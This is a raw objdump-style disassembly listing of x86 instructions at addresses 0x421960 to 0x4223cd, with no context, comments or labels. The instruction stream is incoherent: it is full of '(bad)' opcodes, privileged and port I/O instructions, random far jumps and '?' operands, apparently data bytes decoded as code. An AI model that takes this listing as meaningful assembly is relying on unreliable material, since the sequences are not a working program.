  421960:	(bad)  
  421961:	stos   DWORD PTR es:[edi],eax
  421962:	je     0x42199c
  421964:	xlat   BYTE PTR ds:[ebx]
  421965:	cli    
  421966:	sbb    esp,DWORD PTR [edx+esi*8-0x47]
  42196a:	xchg   edi,eax
  42196b:	lods   eax,DWORD PTR ds:[esi]
  42196c:	into   
  42196d:	and    al,0x28
  42196f:	scas   eax,DWORD PTR es:[edi]
  421970:	xor    al,BYTE PTR [eax+edx*1]
  421973:	scas   eax,DWORD PTR es:[edi]
  421974:	retf   
  421975:	jne    0x4218fd
  421977:	jns    0x42195c
  421979:	xchg   edi,eax
  42197a:	mov    bh,0x31
  42197c:	iret   
  42197d:	push   esp
  42197e:	inc    ebp
  42197f:	add    bh,BYTE PTR [edi+0xcdf5951]
  421985:	inc    edx
  421986:	repnz pop ecx
  421988:	lods   eax,DWORD PTR ds:[esi]
  421989:	lods   al,BYTE PTR ds:[esi]
  42198a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42198b:	sbb    ch,bh
  42198d:	popf   
  42198e:	mov    esi,DWORD PTR [ecx+0x31]
  421991:	cs hlt 
  421993:	cwde   
  421994:	ds (bad) 
  421996:	cs push ss
  421998:	shl    ecx,cl
  42199a:	xor    eax,0xe3b2ac2
  42199f:	iret   
  4219a0:	sub    esp,esp
  4219a2:	xor    ebp,DWORD PTR [esp+eax*1+0x0]
  4219a6:	lods   ax,WORD PTR ds:[esi]
  4219a8:	pop    eax
  4219a9:	sub    bh,0xf3
  4219ac:	cmc    
  4219ad:	into   
  4219ae:	mov    BYTE PTR [edi-0x7b],ch
  4219b1:	push   eax
  4219b2:	cdq    
  4219b3:	clc    
  4219b4:	xor    BYTE PTR [ebx],al
  4219b6:	or     al,0xff
  4219b8:	fidiv  WORD PTR [ecx+ebx*2]
  4219bb:	dec    edi
  4219bc:	stc    
  4219bd:	sbb    DWORD PTR [edx],edx
  4219bf:	sub    al,BYTE PTR ds:0xeb8acc32
  4219c5:	adc    edi,esp
  4219c7:	inc    edx
  4219c8:	pop    edx
  4219c9:	inc    ebp
  4219ca:	sub    esi,DWORD PTR [edi+0x38]
  4219cd:	jnp    0x421958
  4219cf:	fs sub al,0x76
  4219d2:	mov    bh,0xfe
  4219d4:	or     DWORD PTR [ebx],ebx
  4219d6:	xchg   esp,eax
  4219d7:	xchg   esi,eax
  4219d8:	adc    eax,0x3b4eb4f7
  4219dd:	out    0x35,eax
  4219df:	mov    ch,0x3
  4219e1:	sbb    ebx,DWORD PTR [ecx+0x40]
  4219e4:	pop    ecx
  4219e5:	pop    edi
  4219e6:	mov    al,BYTE PTR [edi]
  4219e8:	xor    eax,eax
  4219ea:	xchg   ebp,eax
  4219eb:	pop    esp
  4219ec:	cmp    al,0xf0
	...
  421a56:	(bad)  
  421a57:	cld    
  421a58:	je     0x421a77
  421a5a:	jbe    0x4219f9
  421a5c:	(bad)  
  421a5d:	(bad)  
  421a5e:	jns    0x421a50
  421a60:	sbb    al,0x7b
  421a62:	jecxz  0x421a7f
  421a64:	mov    al,al
  421a66:	imul   eax,DWORD PTR [bx+di],0x10000
  421a6d:	add    BYTE PTR [ecx],dl
  421a6f:	ret    0x7b8b
  421a72:	ss loope 0x421a58
  421a75:	add    edx,esp
  421a77:	scas   eax,DWORD PTR es:[edi]
  421a78:	fistp  DWORD PTR [edi+0x54]
  421a7b:	dec    edx
  421a7c:	mov    dh,BYTE PTR [edi]
  421a7e:	xor    DWORD PTR [edi-0x2b],0x1fb70760
  421a85:	mov    esi,cs
  421a87:	or     BYTE PTR [ebp+0x67],0x74
  421a8b:	retf   
  421a8c:	fstp   QWORD PTR [ebx+esi*2+0x1]
  421a90:	and    bh,bh
  421a92:	sbb    esp,DWORD PTR [edi]
  421a94:	and    BYTE PTR [edx+0x4f870255],0xf7
  421a9b:	mov    bh,0x4b
  421a9d:	fwait
  421a9e:	int    0x69
  421aa0:	imul   eax,DWORD PTR [esi-0x3d],0x38
  421aa4:	test   eax,0xbcedc47a
  421aa9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421aaa:	mov    esp,0xe9233db6
  421aaf:	scas   eax,DWORD PTR es:[edi]
  421ab0:	jp     0x421acc
  421ab2:	adc    bl,BYTE PTR [ebp-0xe]
  421ab5:	in     al,dx
  421ab6:	xor    eax,0x19c6d32a
  421abb:	pop    es
  421abc:	push   esp
  421abd:	add    eax,0x63e7b3e
  421ac2:	shl    BYTE PTR [eax+ebx*2-0x7d],cl
  421ac6:	and    bl,cl
  421ac8:	cli    
  421ac9:	or     DWORD PTR [ebx],esi
  421acb:	sub    ch,BYTE PTR [ebp-0xeffe23d]
  421ad1:	xchg   DWORD PTR [ecx],eax
  421ad3:	fwait
  421ad4:	pop    ds
  421ad5:	or     al,0x0
  421ad7:	sub    edx,DWORD PTR [ebp-0x725b87fc]
  421add:	imul   ecx,DWORD PTR [edi],0x5a989a38
  421ae3:	xchg   ebx,eax
  421ae4:	mov    esp,DWORD PTR [ebx]
  421ae6:	sub    eax,0xd4b0626c
  421aeb:	(bad)
  421aee:	into   
  421aef:	xchg   BYTE PTR [ecx],bh
  421af1:	loop   0x421aec
  421af3:	leave  
  421af4:	sbb    DWORD PTR [ebp-0x3caeb043],0xb64ae271
  421afe:	loop   0x421b53
  421b00:	test   edi,ecx
  421b02:	pop    ss
  421b03:	(bad)
  421b06:	dec    edx
  421b07:	adc    eax,0x724897b4
  421b0c:	and    al,0x26
  421b0e:	push   ebp
  421b0f:	inc    ecx
  421b10:	and    al,0xb0
  421b12:	mov    ds:0x6d8aa49d,al
  421b17:	dec    esp
  421b18:	jbe    0x421adf
  421b1a:	push   es
  421b1b:	mov    dh,0xc4
  421b1d:	test   DWORD PTR gs:[edi],esp
  421b20:	pop    ds
  421b21:	xor    ch,BYTE PTR [edi]
  421b23:	and    edx,DWORD PTR ds:0x51c87cca
  421b29:	jae    0x421b3b
  421b2b:	xchg   ebp,eax
  421b2c:	mov    DWORD PTR [ebx-0x67],ebx
  421b2f:	mov    al,ds:0x9143a1ef
  421b34:	aad    0x13
  421b36:	mov    ecx,0x4115a37d
  421b3b:	xchg   ebx,eax
  421b3c:	push   0xffffff82
  421b3e:	(bad)  
  421b3f:	xchg   ebx,eax
  421b40:	cmp    eax,DWORD PTR [ebp+0x22]
  421b43:	(bad)  
  421b44:	aam    0x4f
  421b46:	es mov edx,0x8de5ed3a
  421b4c:	jp     0x421b12
  421b4e:	test   DWORD PTR [edx-0x3b86419],esi
  421b54:	inc    ecx
  421b55:	int3   
  421b56:	sub    eax,0xecd7c469
  421b5b:	icebp  
  421b5c:	ins    BYTE PTR es:[edi],dx
  421b5d:	sub    BYTE PTR [edi+ecx*1+0x1e],al
  421b61:	std    
  421b62:	stos   BYTE PTR es:[edi],al
  421b63:	mov    ch,0xf0
  421b65:	mov    DWORD PTR [ecx+0x5a8377c1],edx
  421b6b:	es adc eax,0x50
	...
  421bd5:	add    BYTE PTR [esi],dl
  421bd7:	cdq    
  421bd8:	jmp    0x37400baa
  421bdd:	fild   DWORD PTR [ecx+eax*8+0x28]
  421be1:	or     dh,BYTE PTR [edi-0xf]
  421be4:	inc    ebp
  421be5:	ds addr16 push 0x1
  421be9:	add    BYTE PTR [eax],al
  421beb:	add    DWORD PTR [eax],eax
  421bed:	add    BYTE PTR [eax-0x7a],dl
  421bf0:	adc    eax,0x31c6c8ad
  421bf5:	mov    esp,0x1c6565ca
  421bfa:	out    0x10,al
  421bfc:	add    eax,0xb43b569e
  421c01:	pop    edi
  421c02:	test   BYTE PTR [eax],0x28
  421c05:	pushf  
  421c06:	mov    DWORD PTR [ebx+ebp*8+0x2],ecx
  421c0a:	(bad)  
  421c0b:	das    
  421c0c:	add    al,0x8d
  421c0e:	mov    al,0xc3
  421c10:	inc    edx
  421c11:	push   cs
  421c12:	iret   
  421c13:	jge    0x421c91
  421c15:	cmp    BYTE PTR [ecx-0x2446575d],0x12
  421c1c:	mov    edx,0x109fdbf5
  421c21:	mov    edi,0x430a8b39
  421c26:	cmc    
  421c27:	push   ebx
  421c28:	xlat   BYTE PTR ds:[ebx]
  421c29:	jmp    edx
  421c2b:	daa    
  421c2c:	adc    dl,dh
  421c2e:	clc    
  421c2f:	inc    ebp
  421c30:	dec    ecx
  421c31:	mul    BYTE PTR [ebx-0x1d2a5fd5]
  421c37:	push   esp
  421c38:	adc    ebx,DWORD PTR ss:[ecx+0x23e36e48]
  421c3f:	xor    eax,0xb55b507a
  421c44:	mov    al,0x0
  421c46:	pop    ebx
  421c47:	pop    ebx
  421c48:	out    dx,al
  421c49:	push   ss
  421c4a:	aad    0xe0
  421c4c:	in     eax,dx
  421c4d:	sub    BYTE PTR [ecx],dh
  421c4f:	mov    eax,ds:0xba78ea82
  421c54:	sub    al,0x2e
  421c56:	mov    edx,0xfaf0e35f
  421c5b:	out    dx,eax
  421c5c:	push   ebx
  421c5d:	aam    0x70
  421c5f:	mov    DWORD PTR ds:0x6b572051,edx
  421c65:	mov    dl,0x2a
  421c67:	inc    ebp
  421c68:	(bad)  
  421c69:	jmp    0xb78bf4da
  421c6e:	mov    edx,0xbd3be7f5
  421c73:	adc    dl,cl
  421c75:	mov    esi,0xbf43f65d
  421c7a:	imul   esp,DWORD PTR [ebp+ebx*1-0x66],0x916390d3
  421c82:	or     eax,0x4a462c49
  421c87:	xchg   edx,eax
  421c88:	adc    BYTE PTR [ecx+eiz*1-0x72],ch
  421c8c:	cmp    dh,BYTE PTR ds:0x1083058f
  421c92:	not    BYTE PTR fs:[ebp-0x7346a8cb]
  421c99:	jmp    0x421cc4
  421c9b:	repnz mov edx,0x5e6c2c96
  421ca1:	mov    bh,0x6d
  421ca3:	mov    ds:0xfc4697e,eax
  421ca8:	out    dx,eax
  421ca9:	aaa    
  421caa:	push   es
  421cab:	jno    0x421c9a
  421cad:	popa   
  421cae:	xchg   BYTE PTR [ecx],ah
  421cb0:	sub    DWORD PTR [ebp-0x5],ebx
  421cb3:	sub    al,0x93
  421cb5:	mov    eax,0x37026ca1
  421cba:	shl    DWORD PTR [esi+edi*8],0xc4
  421cbe:	rol    BYTE PTR [ebp-0x783a66bc],cl
  421cc4:	ss aas 
  421cc6:	jnp    0x421cfc
  421cc8:	in     eax,dx
  421cc9:	xchg   BYTE PTR [ecx+0x2c],ah
  421ccc:	imul   eax,DWORD PTR [ebp-0x7e272b17],0x292820b9
  421cd6:	jle    0x421cfc
  421cd8:	xchg   edi,eax
  421cd9:	in     eax,dx
  421cda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421cdb:	dec    edx
  421cdc:	jns    0x421cc7
  421cde:	lea    edx,[eax+0x58]
  421ce1:	(bad)  
  421ce3:	or     DWORD PTR [edx-0x2e9bf8ba],edi
  421ce9:	out    dx,al
  421cea:	sub    edi,DWORD PTR [esi+0x2a9e]
	...
  421d54:	add    BYTE PTR [eax],al
  421d56:	mov    al,0x6b
  421d58:	mov    ch,0xe5
  421d5a:	(bad)  
  421d5b:	push   eax
  421d5d:	jg     0x421db3
  421d5f:	dec    edi
  421d60:	xchg   edx,eax
  421d61:	dec    edi
  421d62:	jae    0x421d6a
  421d64:	xchg   BYTE PTR [edi+0x67],ch
  421d67:	imul   eax,DWORD PTR [ecx],0x0
  421d6a:	add    BYTE PTR [ecx],al
  421d6c:	add    BYTE PTR [eax],al
  421d6e:	adc    al,0xa1
  421d70:	icebp  
  421d71:	outs   dx,BYTE PTR ds:[esi]
  421d72:	bound  edi,QWORD PTR [edi+0x8a0674]
  421d78:	adc    dh,BYTE PTR [eax-0xb]
  421d7b:	sbb    BYTE PTR [eax+0x7a193fa],ch
  421d81:	xor    eax,0x94aca2e
  421d86:	out    0xc7,al
  421d88:	fwait
  421d89:	push   ebp
  421d8a:	fdivr  DWORD PTR ds:[ecx]
  421d8d:	jno    0x421d1d
  421d8f:	out    0x93,eax
  421d91:	or     eax,0xd7d4c6ab
  421d96:	jle    0x421d9f
  421d98:	lock add bh,BYTE PTR [edx+0x5e]
  421d9c:	in     eax,dx
  421d9d:	sub    al,0xe2
  421d9f:	aaa    
  421da0:	dec    ecx
  421da1:	mov    ah,0xf8
  421da3:	xchg   ebx,eax
  421da4:	dec    edi
  421da5:	jns    0x421dad
  421da7:	fucomip st,st(7)
  421da9:	xor    DWORD PTR [eax+esi*2],0x16
  421dad:	mov    cl,0x88
  421daf:	pop    ebx
  421db0:	adc    al,BYTE PTR [esi]
  421db2:	fidiv  WORD PTR [ebx+ebp*2-0x7fa454d0]
  421db9:	ins    BYTE PTR es:[edi],dx
  421dba:	div    BYTE PTR [eax+0x54e12dda]
  421dc0:	mov    ecx,DWORD PTR [ebx+0xd656d0f]
  421dc6:	xor    cl,BYTE PTR [ebx]
  421dc8:	push   ebx
  421dc9:	popf   
  421dca:	shl    ah,cl
  421dcc:	adc    eax,0x7abfd5b3
  421dd1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421dd2:	retf   0xbe59
  421dd5:	cmp    al,0xa9
  421dd7:	imul   esi,DWORD PTR gs:[esi+edx*1+0x34130c2d],0x31a7ef97
  421de3:	inc    BYTE PTR [edx]
  421de5:	xchg   edi,eax
  421de6:	fisttp DWORD PTR [ebx-0x54]
  421de9:	ret    0x675a
  421dec:	inc    eax
  421ded:	jmp    0xe0ac:0x7be9fcb7
  421df4:	add    eax,DWORD PTR [eax+0xdd62c58]
  421dfa:	mov    bl,0x7d
  421dfc:	mov    eax,0xdc1b7f1f
  421e01:	enter  0xa21a,0x3c
  421e05:	sahf   
  421e06:	mov    BYTE PTR [edi-0x5f5eb45d],dl
  421e0c:	retf   0x3db1
  421e0f:	call   0x27108eb6
  421e14:	dec    ebp
  421e15:	or     BYTE PTR [ebp+0x54b9355b],al
  421e1b:	ror    BYTE PTR [ecx+0x14184ada],0x95
  421e22:	add    al,BYTE PTR [edx]
  421e24:	mov    ebx,0xd425684f
  421e29:	loop   0x421db1
  421e2b:	add    al,dh
  421e2d:	inc    ebp
  421e2e:	into   
  421e2f:	je     0x421e08
  421e31:	sbb    eax,0x78c92180
  421e36:	test   al,0xd4
  421e38:	mov    esi,edi
  421e3a:	ins    BYTE PTR es:[edi],dx
  421e3b:	ret    0x3c98
  421e3e:	jb     0x421df8
  421e40:	xor    BYTE PTR [edi+0x3448ec2b],cl
  421e46:	or     al,0xa6
  421e48:	test   DWORD PTR [ecx+0x36],eax
  421e4b:	add    eax,0x2118e90e
  421e50:	jno    0x421e00
  421e52:	push   edi
  421e53:	(bad)
  421e57:	and    eax,0x286046e5
  421e5c:	add    BYTE PTR [edi-0x52],ch
  421e5f:	shl    DWORD PTR [ebx+eax*2+0x1d],0x38
  421e64:	test   bh,bh
  421e66:	sbb    eax,0x73006ef5
  421e6b:	ret    0x45
	...
  421ed6:	iret   
  421ed7:	mov    eax,ds:0xbf7f851b
  421edc:	fucomip st,st(3)
  421ede:	push   es
  421edf:	ins    BYTE PTR es:[edi],dx
  421ee0:	xor    al,0xb9
  421ee2:	xor    ch,dl
  421ee4:	inc    eax
  421ee5:	push   edx
  421ee6:	ins    BYTE PTR es:[di],dx
  421ee8:	add    DWORD PTR [eax],eax
  421eea:	add    BYTE PTR [ecx],al
  421eec:	add    BYTE PTR [eax],al
  421eee:	or     bh,dh
  421ef0:	sbb    ebx,0x28
  421ef3:	jbe    0x421eff
  421ef5:	pop    esi
  421ef6:	fst    st(6)
  421ef8:	or     eax,0x110cc325
  421efd:	xchg   ebx,eax
  421efe:	test   eax,0xe0a21f83
  421f03:	out    dx,al
  421f04:	adc    BYTE PTR [ecx-0x46],bh
  421f07:	(bad)  
  421f08:	out    dx,al
  421f09:	sub    eax,DWORD PTR [edx-0x23]
  421f0c:	pop    eax
  421f0d:	mov    edx,0xf2142e0b
  421f12:	jmp    0xcff1:0xbd90e6d7
  421f19:	jmp    0x421ee3
  421f1b:	dec    eax
  421f1c:	rol    ah,1
  421f1e:	loop   0x421f7e
  421f20:	loopne 0x421efc
  421f22:	or     eax,0xdbf219fb
  421f27:	push   ebx
  421f28:	add    BYTE PTR [edx-0xb887075],bh
  421f2e:	xchg   esp,eax
  421f2f:	test   al,0xd5
  421f31:	pop    ds
  421f32:	cmp    al,0xc2
  421f34:	out    0x22,eax
  421f36:	jle    0x421eef
  421f38:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421f39:	cmp    cl,BYTE PTR [eax]
  421f3b:	sub    ebx,edx
  421f3d:	push   esp
  421f3e:	test   BYTE PTR [edx],ch
  421f40:	hlt    
  421f41:	(bad)  
  421f42:	repz lock adc esi,DWORD PTR [edi]
  421f46:	or     bh,BYTE PTR fs:[ebx]
  421f49:	mov    al,ds:0x7d918a57
  421f4e:	cmp    ebp,DWORD PTR [edi]
  421f50:	jl     0x421ed2
  421f52:	addr16 inc ecx
  421f54:	or     edx,DWORD PTR [ebx]
  421f56:	mov    WORD PTR [ebx],cs
  421f58:	push   esp
  421f59:	retf   
  421f5a:	adc    DWORD PTR [edx-0x25],0x32
  421f5e:	mov    cl,0xbc
  421f60:	ror    BYTE PTR ds:0x7febc889,cl
  421f66:	sub    al,0xe6
  421f68:	pause  
  421f6a:	stos   DWORD PTR es:[edi],eax
  421f6b:	jecxz  0x421fca
  421f6d:	stc    
  421f6e:	rol    BYTE PTR [ebx],1
  421f70:	mov    bl,0x65
  421f72:	call   0xfd72c94d
  421f77:	mov    ah,0x3b
  421f79:	arpl   WORD PTR [ecx+0x108fb2c2],bx
  421f7f:	adc    cl,BYTE PTR [eax]
  421f81:	or     DWORD PTR [esi],esp
  421f83:	aad    0xc
  421f85:	pop    eax
  421f86:	cld    
  421f87:	scas   al,BYTE PTR es:[edi]
  421f88:	nop
  421f89:	fs or  esp,edx
  421f8c:	sbb    esp,esp
  421f8e:	cld    
  421f8f:	retf   
  421f90:	dec    DWORD PTR [eax-0x24]
  421f93:	(bad)  
  421f94:	mov    ds:0x4eb6ec2f,al
  421f99:	adc    eax,DWORD PTR [esp+ebp*2]
  421f9c:	dec    ecx
  421f9d:	rcr    DWORD PTR [edi],1
  421f9f:	nop
  421fa0:	xchg   ecx,eax
  421fa1:	faddp  st(2),st
  421fa3:	jno    0x42201a
  421fa5:	clc    
  421fa6:	lods   eax,DWORD PTR ds:[esi]
  421fa7:	scas   eax,DWORD PTR es:[edi]
  421fa8:	add    al,ah
  421faa:	aad    0xf3
  421fac:	arpl   WORD PTR [ebp-0x50],dx
  421faf:	je     0x421f8e
  421fb1:	loope  0x42202a
  421fb3:	rep lods al,BYTE PTR ds:[esi]
  421fb5:	mov    al,0xbf
  421fb7:	enter  0x86a9,0x13
  421fbb:	sbb    eax,DWORD PTR [edi-0x3a5149fc]
  421fc1:	mov    ds:0x4a184feb,al
  421fc6:	aas    
  421fc7:	push   es
  421fc8:	mov    ebx,0xd2fc41e1
  421fcd:	pop    edi
  421fce:	sbb    al,0x4c
  421fd0:	mov    ebp,0x78e9e923
  421fd5:	jae    0x421ffe
  421fd7:	in     al,0x1d
  421fd9:	cs pusha 
  421fdb:	sub    DWORD PTR [ebp+0x60353835],0xd8483826
  421fe5:	test   DWORD PTR [edx+0x6adb136b],edx
  421feb:	mov    dh,ch
  421fed:	inc    edx
	...
  422056:	imul   eax,DWORD PTR [esi],0xffffff8f
  422059:	dec    edi
  42205a:	out    dx,eax
  42205b:	iret   
  42205c:	jmp    0x422084
  42205e:	aas    
  42205f:	in     eax,dx
  422060:	push   es
  422061:	outs   dx,WORD PTR ds:[esi]
  422063:	std    
  422064:	out    0x92,eax
  422066:	ins    DWORD PTR es:[di],dx
  422068:	add    DWORD PTR [eax],eax
  42206a:	add    BYTE PTR [ecx],al
  42206c:	add    BYTE PTR [eax],al
  42206e:	sbb    BYTE PTR [ebp-0x63],ch
  422071:	out    0xd9,eax
  422073:	inc    esi
  422074:	aad    0x4e
  422076:	aas    
  422077:	retf   0xb05d
  42207a:	inc    edi
  42207b:	loopne 0x42201c
  42207d:	repnz lock pop esi
  422080:	loop   0x422020
  422082:	push   ecx
  422083:	popa   
  422084:	and    cl,BYTE PTR [eax-0x6d]
  422087:	das    
  422088:	jge    0x422036
  42208a:	adc    al,0xb0
  42208c:	sbb    ah,BYTE PTR [eax-0x53]
  42208f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  422090:	adc    BYTE PTR [edx-0x39],cl
  422093:	pop    ebp
  422094:	jo     0x4220b3
  422096:	test   bl,ah
  422098:	and    dl,BYTE PTR [eax+eax*8+0x5d8d5d44]
  42209f:	push   esp
  4220a0:	xlat   BYTE PTR ds:[ebx]
  4220a1:	shl    BYTE PTR [ecx-0x7bea69a5],0x9f
  4220a8:	repnz arpl WORD PTR [edi+0x66f7e488],si
  4220af:	jae    0x4220d8
  4220b1:	mov    dl,0x13
  4220b3:	cwde   
  4220b4:	inc    edi
  4220b5:	push   ds
  4220b6:	xchg   edi,eax
  4220b7:	ja     0x4220c6
  4220b9:	gs mov esp,edx
  4220bc:	(bad)  
  4220bd:	icebp  
  4220be:	call   0xe15fadf0
  4220c3:	add    BYTE PTR ds:0x24eb9a7d,0x8c
  4220ca:	sbb    al,0x48
  4220cc:	xchg   DWORD PTR [ebp+0x7b],edx
  4220cf:	jae    0x4220f7
  4220d1:	xor    eax,0xf970fd7
  4220d6:	leave  
  4220d7:	sbb    DWORD PTR [esi-0x7f],0xffffffb6
  4220db:	ja     0x4220a1
  4220dd:	sbb    al,0xe0
  4220df:	(bad)  
  4220e0:	daa    
  4220e1:	cdq    
  4220e2:	ss retf 0x3a9d
  4220e6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4220e7:	sub    eax,0xc4a1998c
  4220ec:	rol    al,cl
  4220ee:	pusha  
  4220ef:	loop   0x422076
  4220f1:	stc    
  4220f2:	mov    esi,0x83c349de
  4220f7:	fadd   QWORD PTR [ebx+esi*1]
  4220fa:	(bad)  
  4220fb:	out    0x9c,eax
  4220fd:	mov    ebp,DWORD PTR [eax]
  4220ff:	add    esp,DWORD PTR [esi]
  422101:	jno    0x4220bf
  422103:	or     edx,DWORD PTR [edx+0x44]
  422106:	sbb    al,0x41
  422108:	inc    ebx
  422109:	jno    0x42212c
  42210b:	pop    ecx
  42210c:	push   ebp
  42210d:	and    BYTE PTR ds:0x737e2e81,ch
  422113:	shl    BYTE PTR [ebx],1
  422115:	fist   WORD PTR [edx]
  422117:	push   edx
  422118:	test   eax,0x9a4ca13
  42211d:	dec    esi
  42211e:	test   eax,0xd4ef9cfc
  422123:	jmp    0x422130
  422125:	jne    0x4220da
  422127:	push   ss
  422128:	jmp    0x99e84ff3
  42212d:	push   edi
  42212e:	ja     0x4220c8
  422130:	adc    BYTE PTR [esi],bl
  422132:	mov    bh,0x3e
  422134:	cmp    dh,BYTE PTR [edx]
  422136:	mov    WORD PTR [esi-0xf],?
  422139:	lods   al,BYTE PTR ds:[esi]
  42213a:	sub    eax,0x64d17dd7
  42213f:	call   FWORD PTR [edx-0x7bc0e4af]
  422145:	push   cs
  422146:	pop    edi
  422147:	nop
  422148:	(bad)  
  42214a:	jle    0x42213b
  42214c:	icebp  
  42214d:	sbb    esi,DWORD PTR [bx+si+0x6d]
  422151:	xchg   ebx,eax
  422152:	sub    al,dl
  422154:	jns    0x4221b2
  422156:	(bad)  
  422157:	out    0x12,eax
  422159:	adc    BYTE PTR [eax-0x1c960895],bh
  42215f:	outs   dx,DWORD PTR ds:[esi]
  422160:	jecxz  0x4220f4
  422162:	push   ds
  422163:	add    al,0x3b
  422165:	dec    eax
  422166:	mov    esi,?
  422168:	push   ecx
  422169:	cli    
  42216a:	(bad)  
  42216b:	cmp    ecx,esi
  42216d:	inc    esp
	...
  4221d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4221d7:	push   edx
  4221d8:	jnp    0x4221d7
  4221da:	(bad)  
  4221db:	std    
  4221dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4221dd:	pop    ebx
  4221de:	dec    edx
  4221df:	sub    al,0x42
  4221e1:	sub    ebx,DWORD PTR [esi+0x61]
  4221e4:	xchg   edi,eax
  4221e5:	mov    ds:0x16e67,al
  4221ea:	add    BYTE PTR [ecx],al
  4221ec:	add    BYTE PTR [eax],al
  4221ee:	jle    0x422258
  4221f0:	adc    DWORD PTR [ecx+0x56],ebp
  4221f3:	inc    edi
  4221f4:	imul   ebx,DWORD PTR [edx],0x7bf1262a
  4221fa:	sub    BYTE PTR [edi],ah
  4221fc:	mov    ah,0x7e
  4221fe:	xchg   esp,eax
  4221ff:	mov    dl,0x5d
  422201:	std    
  422202:	jne    0x422235
  422204:	sbb    BYTE PTR [ebx+0x50ce4840],ah
  42220a:	lea    esp,[edi+eax*1]
  42220d:	add    eax,DWORD PTR [edx-0x44]
  422210:	mov    ebp,0xe77a480e
  422215:	jmp    0xe430:0x31ee93a
  42221c:	(bad)  
  42221d:	and    al,0x45
  42221f:	dec    ebp
  422220:	sbb    DWORD PTR [esi+0x7f],ebx
  422223:	mov    ebx,0xa999e3bb
  422228:	mov    edi,0xc8b914f3
  42222d:	fisttp DWORD PTR es:[ebp+0x65]
  422231:	cmc    
  422232:	or     esi,esp
  422234:	mov    ds:0x784ef26f,al
  422239:	mov    bh,0xb6
  42223b:	mov    ah,0x49
  42223d:	ret    0x7c3a
  422240:	sbb    edx,DWORD PTR [eax]
  422242:	jns    0x4222a0
  422244:	or     eax,0xa83bcd9f
  422249:	dec    si
  42224b:	out    dx,eax
  42224c:	mov    DWORD PTR [eax+ecx*4+0x32],ebx
  422250:	ins    DWORD PTR es:[edi],dx
  422251:	mov    ds:0xd5c9434a,eax
  422256:	mov    edi,0x6702861e
  42225b:	push   es
  42225c:	test   eax,0xdbd07c46
  422261:	addr16 push eax
  422263:	imul   eax,DWORD PTR ds:0x29bb82fc,0x93f32210
  42226d:	mov    edx,0x1c7acb97
  422272:	scas   al,BYTE PTR es:[edi]
  422273:	das    
  422274:	jnp    0x4222be
  422276:	xor    DWORD PTR [ecx],ebp
  422278:	rcl    DWORD PTR [edi],1
  42227a:	aas    
  42227b:	sbb    BYTE PTR [esi],ch
  42227d:	int    0x57
  42227f:	cmp    eax,0xb37469ce
  422284:	sub    al,0xa3
  422286:	mov    edi,0xd61ccaae
  42228b:	test   eax,0x355ed8fb
  422290:	pushf  
  422291:	or     eax,0xd985876a
  422296:	lods   al,BYTE PTR ds:[esi]
  422297:	ret    
  422298:	int    0xbb
  42229a:	sub    esp,esi
  42229c:	cmp    BYTE PTR [ecx+0x25c4c334],0xeb
  4222a3:	enter  0x962c,0xc3
  4222a7:	shl    DWORD PTR [ecx],cl
  4222a9:	je     0x422317
  4222ab:	or     esi,DWORD PTR [ebx-0x32]
  4222ae:	pop    ebx
  4222af:	cdq    
  4222b0:	scas   eax,DWORD PTR es:[edi]
  4222b1:	cmc    
  4222b2:	ret    
  4222b3:	das    
  4222b4:	sub    BYTE PTR [ebx+0x5d],dl
  4222b7:	dec    edi
  4222b8:	dec    eax
  4222b9:	mov    bl,0xa7
  4222bb:	cli    
  4222bc:	in     al,0x84
  4222be:	call   0xe9a1d7f8
  4222c3:	xor    esp,DWORD PTR [eax+0x62]
  4222c6:	int3   
  4222c7:	push   DWORD PTR [edx+0x31e03973]
  4222cd:	out    0x95,eax
  4222cf:	test   eax,0x7b73152d
  4222d4:	and    ch,ah
  4222d6:	lods   al,BYTE PTR ds:[esi]
  4222d7:	and    BYTE PTR [ebx-0x52],0x0
  4222db:	aas    
  4222dc:	sub    eax,0x55c314eb
  4222e1:	jge    0x422351
  4222e3:	sti    
  4222e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4222e5:	sahf   
  4222e6:	xchg   ecx,eax
  4222e7:	mul    BYTE PTR [edi+0x1b]
  4222ea:	cmp    cl,ah
  4222ec:	pop    ss
  4222ed:	jecxz  0x4222ef
	...
  422353:	add    BYTE PTR [eax],al
  422355:	add    BYTE PTR [edi-0x10085213],cl
  42235b:	neg    edi
  42235d:	std    
  42235e:	sub    ebx,DWORD PTR [ebp+0x71]
  422361:	dec    ecx
  422362:	xor    DWORD PTR [edx],0x6f67690a
  422368:	add    DWORD PTR [eax],eax
  42236a:	add    BYTE PTR [ecx],al
  42236c:	add    BYTE PTR [eax],al
  42236e:	addr16 sub eax,0xb4d7805d
  422374:	push   esp
  422375:	inc    edi
  422376:	xor    BYTE PTR [ecx],cl
  422378:	or     esi,esi
  42237a:	fstp   TBYTE PTR ds:[edi]
  42237d:	mov    eax,ds:0xcc21822
  422382:	iret   
  422383:	mov    esp,0x2777f669
  422388:	push   0x3e
  42238a:	test   cl,dh
  42238c:	dec    esi
  42238d:	jl     0x422385
  42238f:	iret   
  422390:	sti    
  422391:	hlt    
  422392:	add    edx,DWORD PTR [esi+0x4a]
  422395:	sbb    eax,0x2b470070
  42239a:	or     DWORD PTR [eax-0x6e],edi
  42239d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42239e:	or     cl,0xe5
  4223a1:	add    esi,DWORD PTR [ecx+0x23]
  4223a4:	retf   0xe2d9
  4223a7:	(bad)  
  4223a8:	inc    edi
  4223a9:	add    al,0x52
  4223ab:	xchg   edx,eax
  4223ac:	and    al,BYTE PTR [edi]
  4223ae:	lahf   
  4223af:	mov    cl,0x44
  4223b1:	inc    edi
  4223b2:	leave  
  4223b3:	out    dx,al
  4223b4:	sbb    ch,BYTE PTR [esi+0x70938729]
  4223ba:	mov    edx,0x9caa5cb7
  4223bf:	add    esp,0x7
  4223c2:	adc    ah,BYTE PTR [edx+0x3430d550]
  4223c8:	aad    0x39
  4223ca:	leave  
  4223cb:	jne    0x4223b3
  4223cd:	cli    
